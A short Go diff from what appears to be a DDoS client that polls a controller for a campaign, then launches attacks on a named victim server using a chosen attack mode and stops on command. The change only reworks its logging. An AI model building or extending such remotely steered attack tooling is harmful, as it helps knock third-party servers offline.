@@ -84,22 +84,16 @@ func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI, logChan chan string) 
 	var cmp CampAPI
 	for {
 		cmp = c.GetCamp()
-		if !cmp.Equals(prevCmp) {
+		if yes, message := cmp.Equals(prevCmp); !yes {
 			select {
 			case <-ChangedDataChan:
 			default:
 			}
 			ChangedDataChan <- cmp
-			if cmp.Settings.DDOSType != prevCmp.Settings.DDOSType {
-				logChan <- "change attack mode " + cmp.Settings.DDOSType
-			}
+			logChan <- message
 			if cmp.Settings.Status == "attacking" {
 				go StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan, logChan)
 			}
-			if cmp.Settings.VictimServer != prevCmp.Settings.VictimServer {
-				logChan <- "Victim server changed to " + cmp.Settings.VictimServer
-			}
-
 			if cmp.Settings.Status == "stopped" {
 				select {
 				case <-stopchan:
